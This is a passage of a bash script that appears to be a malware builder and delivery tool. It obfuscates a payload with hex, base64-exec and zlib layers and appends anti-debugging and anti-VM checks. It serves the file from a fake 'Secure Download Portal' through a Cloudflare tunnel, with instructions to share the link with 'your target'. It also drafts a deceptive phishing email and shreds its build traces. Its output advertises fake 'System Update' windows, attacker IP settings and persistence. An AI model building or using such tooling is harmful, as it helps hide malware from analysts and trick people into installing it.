            python3 - << 'PYTHON_SCRIPT'
import re

def hex_encode(match):
    original = match.group(0)
    inner = original[1:-1]
    hex_data = inner.encode('utf-8').hex()
    hex_str = ''.join([f'\\x{hex_data[i:i+2]}' for i in range(0, len(hex_data), 2)])
    return '"' + hex_str + '"'

with open('payload.py', 'r') as f:
    content = f.read()

content = re.sub(r'"([^"]*)"', hex_encode, content)

with open('payload.py', 'w') as f:
    f.write(content)

print("Hex encoding obfuscation applied.")
PYTHON_SCRIPT
            ;;
        4)
            # Professional: Base64 Encode
            python3 - << 'PYTHON_SCRIPT'
import base64

with open('payload.py', 'r') as f:
    content = f.read()

encoded = base64.b64encode(content.encode('utf-8')).decode('utf-8')

new_content = f'''import base64
exec(base64.b64decode("{encoded}"))
'''

with open('payload.py', 'w') as f:
    f.write(new_content)

print("Base64 encoding obfuscation applied.")
PYTHON_SCRIPT
            ;;
        5)
            # Military Grade: Compression + Base64
            python3 - << 'PYTHON_SCRIPT'
import zlib
import base64

with open('payload.py', 'rb') as f:
    content = f.read()

compressed = zlib.compress(content)
encoded = base64.b64encode(compressed).decode('utf-8')

new_content = f'''import zlib, base64
exec(zlib.decompress(base64.b64decode("{encoded}")))
'''

with open('payload.py', 'w') as f:
    f.write(new_content)

print("Compression + Base64 obfuscation applied.")
PYTHON_SCRIPT
            ;;
    esac
    
    log_message "INFO" "Obfuscation level $level applied"
}

apply_anti_debug() {
    echo -e "${Y}[*] Applying anti-debugging techniques...${NC}"
    
    cat >> payload.py << 'EOF'

import sys
import os
import time

def check_debugger():
    try:
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                # print(f'Debugger detected: {debugger}')
                return True
        return False
    except:
        return False

def check_timing():
    start = time.time()
    time.sleep(0.1)
    end = time.time()
    if (end - start) > 0.15:
        # print('Timing anomaly detected')
        return True
    return False

if check_debugger() or check_timing():
    # print('Debugging environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-debugging techniques applied"
}

apply_anti_vm() {
    echo -e "${Y}[*] Applying anti-VM techniques...${NC}"
    
    cat >> payload.py << 'EOF'

def check_vm():
    try:
        vm_indicators = [
            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
            '/sys/class/dmi/id/product_name'
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                with open(indicator, 'r') as f:
                    content = f.read().lower()
                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm']):
                        # print('Virtualization detected')
                        return True
        
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56')):
                # print('VM MAC address detected')
                return True
        except:
            pass
        
        return False
    except:
        return False

if check_vm():
    # print('Virtual environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-VM techniques applied"
}

# Delivery methods
deliver_payload() {
    local payload_path=$1
    local delivery_method=$2
    local delivery_targets=$3
    
    if [ -z "$delivery_method" ]; then
        log_message "INFO" "No delivery method specified, skipping delivery"
        return 0
    fi
    
    log_message "INFO" "Preparing delivery using method: $delivery_method"
    
    case "$delivery_method" in
        "email")
            deliver_via_email "$payload_path" "$delivery_targets"
            ;;
        "usb")
            deliver_via_usb "$payload_path" "$delivery_targets"
            ;;
        "web")
            deliver_via_web "$payload_path" "$delivery_targets"
            ;;
        "network")
            deliver_via_network "$payload_path" "$delivery_targets"
            ;;
        "social_engineering")
            deliver_via_social_engineering "$payload_path" "$delivery_targets"
            ;;
        "bundle")
            deliver_via_bundling "$payload_path" "$delivery_targets"
            ;;
        "cloudflare_tunnel")
            deliver_via_cloudflare_tunnel "$payload_path" "$delivery_targets"
            ;;
        *)
            log_message "ERROR" "Unknown delivery method: $delivery_method"
            return 1
            ;;
    esac
    
    return $?
}

deliver_via_cloudflare_tunnel() {
    local payload_path=$1
    local local_port=$2
    
    echo -e "${Y}[*] Setting up Cloudflare tunnel delivery...${NC}"
    
    # Setup cloudflared
    if ! setup_cloudflared; then
        log_message "ERROR" "Failed to setup cloudflared"
        return 1
    fi
    
    # Create a simple HTTP server to serve the payload
    local server_script="$TEMP_DIR/server.py"
    cat > "$server_script" << EOF
#!/usr/bin/env python3
from flask import Flask, send_file, render_template_string, request, redirect
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    # Check if the request is for the root domain or a specific path
    if request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Secure Download Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 18px; margin: 20px 0; }
        .download-btn:hover { background-color: #3367d6; }
        .info { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .footer { text-align: center; margin-top: 30px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Secure Download Portal</h1>
            <p>Download your secure files</p>
        </div>
        <div class="info">
            <h3>File Information</h3>
            <p><strong>Filename:</strong> $(basename "$payload_path")</p>
            <p><strong>Size:</strong> $(stat -f%z "$payload_path" 2>/dev/null || stat -c%s "$payload_path") bytes</p>
            <p><strong>Type:</strong> Secure Executable</p>
            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
        </div>
        <div style="text-align: center;">
            <a href="/download" class="download-btn">Download File</a>
        </div>
        <div class="footer">
            <p>This is a secure download portal. All downloads are logged.</p>
            <p>&copy; $(date +%Y) Secure Downloads</p>
        </div>
    </div>
</body>
</html>
''')
    else:
        # For any other path, redirect to the download
        return redirect('/download')

@app.route('/download')
def download():
    payload_path = "$payload_path"
    if os.path.exists(payload_path):
        return send_file(payload_path, as_attachment=True, download_name="$(basename "$payload_path")")
    return "File not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=$local_port, debug=False)
EOF
    
    chmod +x "$server_script"
    
    # Start the HTTP server in background
    echo -e "${Y}[*] Starting HTTP server on port $local_port...${NC}"
    python3 "$server_script" &
    local server_pid=$!
    
    # Wait for server to start
    sleep 3
    
    # Start Cloudflare tunnel
    if start_cloudflare_tunnel "$local_port" "$TEMP_DIR"; then
        echo -e "${G}[+] Cloudflare tunnel established successfully!${NC}"
        echo -e "${G}[+] Secure download URL: $CLOUDFLARE_TUNNEL_URL${NC}"
        
        # Create a QR code for the URL if qrencode is available
        if command -v qrencode &> /dev/null; then
            echo -e "${Y}[*] Generating QR code for download URL...${NC}"
            qrencode -t ANSI "$CLOUDFLARE_TUNNEL_URL"
        fi
        
        # Save tunnel information
        local tunnel_info="$DELIVERY_DIR/cloudflare_tunnel_info.txt"
        cat > "$tunnel_info" << EOF
CLOUDFLARE TUNNEL INFORMATION
=============================
Tunnel URL: $CLOUDFLARE_TUNNEL_URL
Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
Local Port: $local_port
Server PID: $server_pid
Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
Start Time: $(date)
Payload: $(basename "$payload_path")
Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
Appearance: $([ "$FAKE_GUI_ENABLED" = true ] && echo "Fake GUI (System Update)" || echo "Silent")

Usage:
1. Share the tunnel URL with your target
2. Target can download the payload securely using: $CLOUDFLARE_TUNNEL_URL/download
3. All traffic is encrypted through Cloudflare

To stop the tunnel:
kill $server_pid
kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
EOF
        
        echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
        echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
        
        # Ask if user wants to keep the tunnel running
        echo -e "\n${Y}[*] Tunnel is now running. Press Ctrl+C to stop the tunnel.${NC}"
        echo -e "${Y}[*] Or run the following commands to stop it:${NC}"
        echo -e "${Y}    kill $server_pid${NC}"
        echo -e "${Y}    kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")${NC}"
        
        # Wait for user to stop the tunnel
        trap 'stop_cloudflare_tunnel; kill $server_pid 2>/dev/null; exit' INT
        while true; do
            sleep 1
        done
    else
        kill $server_pid 2>/dev/null
        log_message "ERROR" "Failed to establish Cloudflare tunnel"
        return 1
    fi
}

# Other delivery methods (abbreviated for space - keep all the existing ones)
deliver_via_email() {
    local payload_path=$1
    local recipients=$2
    
    echo -e "${Y}[*] Preparing email delivery...${NC}"
    
    # Create email template
    local email_template="$DELIVERY_DIR/email_template.html"
    local subject="Important Document - Please Review"
    
    # Generate a convincing email template
    cat > "$email_template" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Important Document</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f2f2f2; padding: 10px; text-align: center; }
        .content { margin-top: 20px; }
        .footer { margin-top: 30px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Important Document</h2>
    </div>
    <div class="content">
        <p>Dear recipient,</p>
        <p>Please find attached an important document that requires your immediate attention.</p>
        <p>This document contains critical information that needs to be reviewed by the end of business day.</p>
        <p>Thank you for your cooperation.</p>
        <p>Best regards,<br>Administrative Department</p>
    </div>
    <div class="footer">
        <p>This email and any attachments are confidential and intended solely for the use of the individual or entity to whom they are addressed.</p>
    </div>
</body>
</html>
EOF
    
    # Create a Python script to send emails
    local email_script="$DELIVERY_DIR/send_email.py"
    cat > "$email_script" << EOF
#!/usr/bin/env python3
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sys

def send_email(recipient, payload_path, template_path):
    # Email configuration (educational template only)
    sender_email = "admin@example.com"
    password = "password"
    
    # Create message
    message = MIMEMultipart("alternative")
    message["Subject"] = "$subject"
    message["From"] = sender_email
    message["To"] = recipient
    
    # Read HTML template
    with open(template_path, "r") as f:
        html_content = f.read()
    
    # Attach HTML content
    html_part = MIMEText(html_content, "html")
    message.attach(html_part)
    
    # Attach payload
    with open(payload_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    
    filename = payload_path.split("/")[-1]
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    
    message.attach(part)
    
    # This is an educational template - no actual emails are sent
    print(f"Email prepared for {recipient}")
    print(f"Subject: {message['Subject']}")
    print(f"Attachment: {filename}")
    print("This is an educational template - no actual emails are sent")
    
    # In a real scenario, you would connect to an SMTP server and send the email
    # context = ssl.create_default_context()
    # with smtplib.SMTP_SSL("smtp.example.com", 465, context=context) as server:
    #     server.login(sender_email, password)
    #     server.sendmail(sender_email, recipient, message.as_string())
    
    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 send_email.py <recipient> <payload_path>")
        sys.exit(1)
    
    recipient = sys.argv[1]
    payload_path = sys.argv[2]
    template_path = sys.argv[3] if len(sys.argv) > 3 else "$email_template"
    
    send_email(recipient, payload_path, template_path)
EOF
    
    chmod +x "$email_script"
    
    # Send to all recipients
    IFS=',' read -ra RECIPIENTS <<< "$recipients"
    for recipient in "${RECIPIENTS[@]}"; do
        recipient=$(echo "$recipient" | xargs)  # Trim whitespace
        if [ -n "$recipient" ]; then
            echo -e "${Y}[*] Preparing email for $recipient...${NC}"
            python3 "$email_script" "$recipient" "$payload_path" "$email_template"
        fi
    done
    
    log_message "SUCCESS" "Email delivery preparation completed"
    return 0
}

# Cleanup
cleanup() {
    log_message "INFO" "Performing cleanup..."
    
    # Stop Cloudflare tunnel if running
    stop_cloudflare_tunnel
    
    cd ..
    
    if [ "$KEEP_BUILD_FILES" != "true" ]; then
        if [ -d "$WORK_DIR" ]; then
            if command -v shred &> /dev/null; then
                find "$WORK_DIR" -type f -exec shred -vfz -n 3 {} \;
            fi
            rm -rf "$WORK_DIR"
            log_message "INFO" "Removed temporary build files"
        fi
    else
        log_message "INFO" "Keeping temporary build files as requested"
    fi
    
    if [ -d "$TEMP_DIR" ]; then
        if command -v shred &> /dev/null; then
            find "$TEMP_DIR" -type f -exec shred -vfz -n 3 {} \;
        fi
        rm -rf "$TEMP_DIR"
    fi
    
    deactivate 2>/dev/null || true
    
    log_message "SUCCESS" "Cleanup complete"
}

# Initialization
init() {
    trap cleanup EXIT
    
    init_logging
    display_banner
    check_dependencies
    
    if ! load_config; then
        log_message "INFO" "No existing configuration found, using defaults"
    fi
}

# Main function
main() {
    init
    
    get_configuration
    setup_environment
    
    if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
        if [ "$TARGET_OS" == "Cross-platform" ]; then
            echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
            echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
            else
                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
            fi
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
            fi
            log_message "SUCCESS" "Cross-platform payload generation completed successfully"
        else
            echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
            echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
            else
                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
            fi
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
            fi
            log_message "SUCCESS" "Payload generation completed successfully"
        fi
        
        # If delivery method is specified, deliver the payload
        if [ -n "$DELIVERY_METHOD" ]; then
            # Get the full path to the payload
            local payload_full_path
            if [ "$TARGET_OS" == "Cross-platform" ]; then
                payload_full_path="$(pwd)/../cross_platform_builds"
            else
                payload_full_path="$(pwd)/../$FINAL_NAME"
            fi
            
            if deliver_payload "$payload_full_path" "$DELIVERY_METHOD" "$DELIVERY_TARGETS"; then
                echo -e "${G}>> DELIVERY COMPLETE.${NC}"
                log_message "SUCCESS" "Payload delivery completed successfully"
            else
                echo -e "${R}>> DELIVERY FAILED.${NC}"
                log_message "ERROR" "Payload delivery failed"
            fi
        fi
    else
        echo -e "${R}>> PAYLOAD GENERATION FAILED.${NC}"
        log_message "ERROR" "Payload generation failed"
    fi
}

# Execute main function
main "$@"
